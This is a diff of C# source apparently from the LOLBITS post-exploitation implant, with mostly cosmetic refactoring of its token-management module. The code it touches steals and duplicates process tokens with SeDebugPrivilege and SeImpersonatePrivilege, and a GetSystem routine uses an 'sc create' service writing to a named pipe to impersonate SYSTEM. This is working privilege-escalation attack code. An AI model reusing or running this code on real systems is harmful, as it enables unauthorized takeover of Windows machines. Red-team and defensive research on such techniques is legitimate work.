@@ -31,7 +31,7 @@ namespace LOLBITS.TokenManagement
 
         public bool Impersonate (int pid)
         {
-            List<string> privileges = new List<string>
+            var privileges = new List<string>
             {
                 "SeDebugPrivilege",
                 "SeImpersonatePrivilege",
@@ -54,28 +54,28 @@ namespace LOLBITS.TokenManagement
 
                 Utils.CloseHandle(handlePointer);
 
-                Utils.TokenAccessFlags tokenAccess =
+                var tokenAccess =
                     Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
                     Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
                     Utils.TokenAccessFlags.TokenAdjustSessionId;
 
                 Utils.DuplicateToken(tokenPointer, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation,
-                    Utils.TokenType.TokenPrimary, out var imptoken);
+                    Utils.TokenType.TokenPrimary, out var impToken);
 
-                Utils.StartupInfo startupInfo = new Utils.StartupInfo();
+                var startupInfo = new Utils.StartupInfo();
                 startupInfo.cb = Marshal.SizeOf(startupInfo);
                 startupInfo.lpDesktop = "";
                 startupInfo.wShowWindow = 0;
                 startupInfo.dwFlags |= 0x00000001;
 
-                Utils.ProcessInformation processInfo = new Utils.ProcessInformation();
+                var processInfo = new Utils.ProcessInformation();
 
                 if (Method == 0)
-                    Utils.DetermineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);
+                    Utils.DetermineImpersonationMethod(impToken, new Utils.LogonFlags(), startupInfo, out processInfo);
 
                 if (Method != 0)
                 {
-                    Token = imptoken;
+                    Token = impToken;
                     return true;
                 }
             }
@@ -90,10 +90,10 @@ namespace LOLBITS.TokenManagement
         public static bool GetSystem()
         {
             _pipeName = Jobs.RandomString(7);
-            bool exit = false;
-            Thread server = new Thread(ServerThread);
+            var exit = false;
+            var server = new Thread(ServerThread);
 
-            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
+            var cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
             Utils.ExecuteCommand(cmd);
 
             server.Start();
@@ -119,8 +119,8 @@ namespace LOLBITS.TokenManagement
 
         private static void ServerThread(object data)
         {
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
-            int threadId = Thread.CurrentThread.ManagedThreadId;
+            var pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
+            var threadId = Thread.CurrentThread.ManagedThreadId;
 
             // Wait for a client to connect
             pipeServer.WaitForConnection();
@@ -130,10 +130,10 @@ namespace LOLBITS.TokenManagement
                 // Read the request from the client. Once the client has
                 // written to the pipe its security token will be available.
 
-                StreamString ss = new StreamString(pipeServer);
+                var ss = new StreamString(pipeServer);
 
-                string filename = ss.ReadString();
-                Utils fileReader = new Utils();
+                var filename = ss.ReadString();
+                var fileReader = new Utils();
 
                 pipeServer.RunAsClient(Utils.Start);
 
@@ -154,10 +154,7 @@ namespace LOLBITS.TokenManagement
         {
             Utils.RunAs(domain, user, password);
 
-            if (Method == 3)
-                return true;
-
-            return false;
+            return Method == 3;
         }
     }
 }
